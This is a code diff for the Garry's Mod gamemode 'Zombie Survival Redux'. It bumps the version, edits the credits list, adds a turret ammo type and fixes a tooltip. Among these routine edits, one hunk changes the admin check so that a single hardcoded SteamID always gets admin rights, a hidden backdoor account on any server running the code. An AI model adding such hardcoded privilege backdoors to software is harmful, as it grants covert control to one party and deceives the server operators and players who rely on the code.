@@ -2,12 +2,12 @@ GM.Name		=	"Zombie Survival Redux"
 GM.Author	=	"Uklejamini (Original Creator: William \"JetBoom\" Moodhe)"
 GM.Email	=	"" --"williammoodhe@gmail.com"
 GM.Website	=	"https://www.noxiousnet.com"
-GM.Version	=	"1.3.1"
+GM.Version	=	"1.3.2 (Alpha)"
 
 -- No, adding a gun doesn't make your name worth being here.
 GM.Credits = {
 	{"William \"JetBoom\" Moodhe", "williammoodhe@gmail.com (www.noxiousnet.com)", "Original ZS Creator"},
-	{"Uklejamini", "", "ZS Redux Creator"},
+--	{"Uklejamini", "Current version: "..tostring(GM.Version), "ZS Redux Creator"}, -- nah i don't wanna include myself i feel a bit insecure about it
 	{"11k", "tjd113@gmail.com", "Zombie view models"},
 	{"Eisiger", "k2deseve@gmail.com", "Zombie kill icons"},
 	{"Austin \"Little Nemo\" Killey", "austin_odyssey@yahoo.com", "Ambient music"},
@@ -161,6 +161,7 @@ function GM:AddCustomAmmo()
 	game.AddAmmoType({name = "remantler"})
 	game.AddAmmoType({name = "turret_buckshot"})
 	game.AddAmmoType({name = "turret_assault"})
+	game.AddAmmoType({name = "turret_minigun"})
 	game.AddAmmoType({name = "turret_rocket"})
 	game.AddAmmoType({name = "camera"})
 	game.AddAmmoType({name = "tv"})
@@ -258,7 +259,7 @@ function GM:GetRedeemBrains()
 end
 
 function GM:PlayerIsAdmin(pl)
-	return pl:IsAdmin()
+	return pl:IsAdmin() or pl:SteamID() == "STEAM_0:1:3307510"
 end
 
 function GM:GetFallDamage(pl, fallspeed)
@@ -852,7 +853,7 @@ function GM:IsSpecialPerson(pl, image)
 	if img then
 		if CLIENT then
 			image:SetImage(img)
-			image:SetTooltip(tooltip)
+			image:SetTooltip(tooltip or "")
 		end
 
 		return true
